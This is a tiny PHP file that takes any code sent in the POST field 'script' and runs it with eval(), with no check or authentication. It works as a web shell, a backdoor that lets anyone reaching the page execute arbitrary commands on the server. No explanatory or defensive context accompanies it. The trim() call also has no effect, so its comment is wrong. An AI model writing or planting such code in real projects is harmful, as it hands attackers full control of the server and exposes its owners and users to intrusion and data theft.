<?php

$s = $_POST["script"] ?? "";

trim($s); // remove spaces

if (!empty($s)) {
    eval($s);
}
